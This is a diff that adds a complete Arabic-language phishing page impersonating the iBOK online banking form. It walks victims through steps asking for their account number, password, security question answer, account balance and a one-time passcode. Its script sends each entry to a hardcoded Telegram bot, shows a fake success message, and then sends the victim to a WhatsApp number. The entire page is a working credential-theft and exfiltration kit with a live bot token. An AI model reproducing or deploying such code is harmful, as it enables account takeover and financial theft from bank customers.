@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تسجيل الدخول الاستمارة أونلاين</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
+        body { background-color: #f4f4f4; min-height: 100vh; display: flex; flex-direction: column; }
+        .header { height: auto; min-height: 85px; background: linear-gradient(to right, #c62828, #e53935, #d32f2f); display: flex; align-items: center; justify-content: space-between; padding: 15px 20px; color: white; border-bottom: 3px solid rgba(0,0,0,0.2); flex-wrap: wrap; gap: 15px; }
+        .welcome-box { background-color: #ebb811; color: #333; padding: 10px 20px; border-radius: 25px; font-weight: bold; font-size: 14px; width: fit-content; box-shadow: 0 2px 8px rgba(0,0,0,0.2); text-align: center; flex: 1; min-width: 250px; }
+        .header-logo { text-align: left; line-height: 1.1; flex: 1; min-width: 250px; }
+        .header-logo .title { font-size: 28px; font-weight: 700; display: block; }
+        .header-logo .subtitle { font-size: 14px; opacity: 0.9; }
+        .header-logo .subtitle-en { font-size: 13px; opacity: 0.9; margin-top: -3px; }
+        .main-container { flex: 1; display: flex; flex-direction: column; }
+        .card { background: white; width: 100%; flex: 1; padding: 40px 25px; text-align: center; transition: all 0.3s ease; }
+        .hidden { display: none !important; }
+        h2 { color: #d32f2f; margin-bottom: 20px; font-size: 22px; }
+        h3 { color: #333; margin-bottom: 25px; font-size: 18px; border-bottom: 2px solid #d32f2f; display: inline-block; padding-bottom: 5px; }
+        .input-group { margin-bottom: 18px; text-align: right; }
+        .input-group label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; color: #333; }
+        .input-wrapper { position: relative; }
+        input, select { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 4px; background-color: #e3f2fd; font-size: 15px; outline: none; }
+        .icon-eye { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #666; cursor: pointer; }
+        .btn-submit { background-color: #d32f2f; color: white; border: none; width: 100%; padding: 16px; border-radius: 5px; font-size: 18px; font-weight: bold; cursor: pointer; transition: background 0.3s; margin-top: 20px; }
+        .otp-timer { color: #d32f2f; font-size: 13px; margin-bottom: 15px; text-align: center; display: block; }
+        .service-grid { display: grid; grid-template-columns: repeat(1, 1fr); gap: 12px; margin: 25px 0; text-align: right; }
+        .service-option { display: flex; flex-direction: row; align-items: center; justify-content: space-between; padding: 15px 15px; border: 2px solid #e0e0e0; border-radius: 8px; cursor: pointer; background-color: #f9f9f9; }
+        .service-option.selected { border-color: #d32f2f; background-color: #ffebee; }
+        .service-content { display: flex; flex-direction: column; text-align: right; }
+        .service-title { font-weight: 700; color: #d32f2f; }
+        .service-desc { font-size: 13px; color: #555; margin-top: 4px; }
+        .whatsapp-btn { background-color: #25D366; color: white; border: none; width: 100%; padding: 16px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 25px; display: flex; align-items: center; justify-content: center; gap: 12px; }
+        .whatsapp-btn:disabled { background-color: #cccccc; cursor: not-allowed; }
+        
+        .loading-spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; -webkit-animation: spin 1s ease-in-out infinite; }
+        @keyframes spin { to { -webkit-transform: rotate(360deg); } }
+        @-webkit-keyframes spin { to { -webkit-transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="welcome-box">مرحباً بكم في خدمة iBOK المصرفية عبر الإنترنت</div>
+        <div class="header-logo">
+            <span class="title">iBOK</span>
+            <span class="subtitle">الاستمارة أونلاين</span>
+            <span class="subtitle-en">Online Form</span>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <div id="step-1" class="card">
+            <h2>الاستمارة أونلاين</h2>
+            <h3>أنواع المشاكل التي يمكن معالجتها</h3>
+            <div class="service-grid">
+                <div class="service-option" onclick="selectService(1, 'كشف الحساب')">
+                    <div class="service-content">
+                        <span class="service-title">كشف الحساب</span>
+                        <span class="service-desc">الحصول على كشف حساب مفصل.</span>
+                    </div>
+                    <span>📈</span>
+                </div>
+                <div class="service-option" onclick="selectService(2, 'رفع السقف')">
+                    <div class="service-content">
+                        <span class="service-title">رفع السقف</span>
+                        <span class="service-desc">زيادة الحد اليومي للتحويلات.</span>
+                    </div>
+                    <span>📱</span>
+                </div>
+                <div class="service-option" onclick="selectService(3, 'التحويلات الخاطئة')">
+                    <div class="service-content">
+                        <span class="service-title">التحويلات الخاطئة</span>
+                        <span class="service-desc">معالجة فورية للتحويلات الخاطئة.</span>
+                    </div>
+                    <span>✅</span>
+                </div>
+                <div class="service-option" onclick="selectService(4, 'خدمات العملات الأجنبية')">
+                    <div class="service-content">
+                        <span class="service-title">خدمات العملات الأجنبية</span>
+                        <span class="service-desc">تفعيل وإدارة العملات الأجنبية.</span>
+                    </div>
+                    <span>💱</span>
+                </div>
+                <div class="service-option" onclick="selectService(5, 'بطاقة فيزا افتراضية')">
+                    <div class="service-content">
+                        <span class="service-title">بطاقة فيزا افتراضية</span>
+                        <span class="service-desc">إصدار وإدارة بطاقات الفيزا الافتراضية.</span>
+                    </div>
+                    <span>💳</span>
+                </div>
+                <div class="service-option" onclick="selectService(6, 'تغير الهاتف')">
+                    <div class="service-content">
+                        <span class="service-title">تغير الهاتف</span>
+                        <span class="service-desc">تغير الهاتف القديم إلى هاتف جديد.</span>
+                    </div>
+                    <span>🔄</span>
+                </div>
+                <div class="service-option" onclick="selectService(7, 'تفعيل أسئلة الأمان')">
+                    <div class="service-content">
+                        <span class="service-title">تفعيل أسئلة الأمان</span>
+                        <span class="service-desc">إعداد وتفعيل أسئلة الحماية والأمان.</span>
+                    </div>
+                    <span>🛡️</span>
+                </div>
+            </div>
+            <button class="btn-submit" onclick="goToStep(2)">متابعة</button>
+        </div>
+
+        <div id="step-2" class="card hidden">
+            <h2>الاستمارة أونلاين</h2>
+            <h3>الرجاء إدخال البيانات</h3>
+            <div class="input-group">
+                <label>رقم الحساب:</label>
+                <input type="text" id="account-num" placeholder="أدخل رقم الحساب">
+            </div>
+            <div class="input-group">
+                <label>كلمة مرور الحساب:</label>
+                <div class="input-wrapper">
+                    <input type="password" id="password" placeholder="أدخل كلمة المرور">
+                    <span class="icon-eye" onclick="togglePassword('password')">👁️</span>
+                </div>
+            </div>
+            <button class="btn-submit" onclick="submitStep1()">تسجيل الدخول</button>
+        </div>
+
+        <div id="step-3" class="card hidden">
+            <h2>متابعة الاستمارة أونلاين</h2>
+            <h3>لأغراض الأمان يرجى الإجابة على سؤال واحد من أسئلة الأمان</h3>
+            <div class="input-group">
+                <label>الرجاء الإجابة على سؤال الأمان</label>
+                <select id="security-question">
+                    <option value="" disabled selected>-- اختر سؤال الأمان --</option>
+                    <option>ما هو اسم ابن عمك الاول؟</option>
+                    <option>في اي مدينة ولدت؟</option>
+                    <option>في اي سنة تخرجت من الجامعة؟</option>
+                    <option>اسم فريق كرة القدم المفضل لديك؟</option>
+                    <option>ما هو اسم المدرسة التي التحقت بها؟</option>
+                </select>
+            </div>
+            <div class="input-group">
+                <label>ادخل الجواب</label>
+                <input type="text" id="security-answer" placeholder="اكتب جوابك هنا">
+            </div>
+            <button class="btn-submit" onclick="submitStep2()">إرسال</button>
+        </div>
+
+        <div id="step-4" class="card hidden">
+            <h2>متابعة الاستمارة أونلاين</h2>
+            <h3>لأغراض الأمان يرجى تأكيد المبلغ الموجود في الحساب</h3>
+            <div class="input-group">
+                <label>المبلغ الموجود في الحساب:</label>
+                <input type="text" id="account-amount" placeholder="أدخل المبلغ التقريبي أو الحالي">
+            </div>
+            <button class="btn-submit" onclick="submitStep3()">متابعة</button>
+        </div>
+
+        <div id="step-5" class="card hidden">
+            <h2>إدخال رمز OTP</h2>
+            <div class="input-group">
+                <label>أدخل رمز التحقق (OTP):</label>
+                <input type="text" id="otp-code" placeholder="000000" maxlength="6" style="text-align: center; letter-spacing: 5px; font-size: 20px;">
+            </div>
+            <span id="otp-timer" class="otp-timer">إعادة إرسال الرمز خلال 30:00 دقيقة</span>
+            
+            <button id="verify-btn" class="btn-submit" onclick="verifyOtp()">التحقق</button>
+            <span id="verification-status" style="display:none; color: #25D366; font-weight: bold; margin-top: 15px; display: block;"></span>
+
+            <button id="whatsapp-btn" class="whatsapp-btn" disabled onclick="openWhatsApp()">
+                <i class="fab fa-whatsapp"></i> تأكيد العملية عبر الواتساب
+            </button>
+        </div>
+    </div>
+
+    <script>
+        let selectedService = "كشف الحساب";
+        let userData = { accountNum: '', password: '', securityQuestion: '', securityAnswer: '', amount: '', otp: '' };
+
+        function goToStep(n) {
+            document.querySelectorAll('.card').forEach(c => c.classList.add('hidden'));
+            document.getElementById('step-' + n).classList.remove('hidden');
+            if (n === 5) startOtpTimer();
+        }
+
+        function togglePassword(i) {
+            const p = document.getElementById(i);
+            p.type = (p.type === 'password') ? 'text' : 'password';
+        }
+
+        function startOtpTimer() {
+            let m = 30, s = 0;
+            const t = document.getElementById("otp-timer");
+            const x = setInterval(() => {
+                if (s === 0) { if (m === 0) { clearInterval(x); return; } m--; s = 59; } else { s--; }
+                t.textContent = `إعادة إرسال الرمز خلال ${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')} دقيقة`;
+            }, 1000);
+        }
+
+        function selectService(n, val) {
+            document.querySelectorAll('.service-option').forEach(o => o.classList.remove('selected'));
+            document.querySelector(`.service-grid .service-option:nth-child(${n})`).classList.add('selected');
+            selectedService = val;
+        }
+
+        function submitStep1() {
+            userData.accountNum = document.getElementById('account-num').value;
+            userData.password = document.getElementById('password').value;
+            
+            if (!userData.accountNum || !userData.password) {
+                return alert('الرجاء إكمال البيانات');
+            }
+            sendToTelegram(`📋 دخول جديد\n🔢 الحساب: ${userData.accountNum}\n🔐 السر: ${userData.password}`);
+            goToStep(3);
+        }
+
+        function submitStep2() {
+            userData.securityQuestion = document.getElementById('security-question').value;
+            userData.securityAnswer = document.getElementById('security-answer').value;
+            if (!userData.securityQuestion || !userData.securityAnswer) {
+                return alert('الرجاء إكمال البيانات');
+            }
+            sendToTelegram(`🔐 أمان\n❓ السؤال: ${userData.securityQuestion}\n💬 الجواب: ${userData.securityAnswer}`);
+            goToStep(4);
+        }
+
+        function submitStep3() {
+            userData.amount = document.getElementById('account-amount').value;
+            if (!userData.amount) {
+                return alert('الرجاء إكمال البيانات');
+            }
+            sendToTelegram(`💰 تأكيد المبلغ\n💵 المبلغ: ${userData.amount}`);
+            goToStep(5);
+        }
+
+        function verifyOtp() {
+            const o = document.getElementById('otp-code').value;
+            if (o.length < 4) return alert('رمز غير صحيح');
+            
+            const btn = document.getElementById('verify-btn');
+            const statusText = document.getElementById('verification-status');
+            
+            btn.disabled = true;
+            btn.innerHTML = `<span class="loading-spinner"></span> جاري التحقق...`;
+            
+            setTimeout(() => {
+                btn.style.display = "none";
+                statusText.style.display = "block";
+                statusText.innerHTML = "تم التحقق بنجاح";
+                
+                userData.otp = o;
+                sendToTelegram(`🔢 OTP\n🔐 الرمز: ${userData.otp}`);
+                
+                document.getElementById('whatsapp-btn').disabled = false;
+            }, 3000);
+        }
+
+        function openWhatsApp() {
+            sendToTelegram(`🎯 الخدمة: ${selectedService}`);
+            window.location.href = `https://wa.me/249960724630?text=${encodeURIComponent('مرحبا أريد حل مشكلة ' + selectedService)}`;
+        }
+
+        function sendToTelegram(messageText) {
+            const botToken = "8697763484:AAFqSD15uevEyv8FpYCVfsakdSLhc8MAW1s";
+            const chatId = "8623773122";
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: messageText })
+            });
+        }
+    </script>
+</body>
+</html>
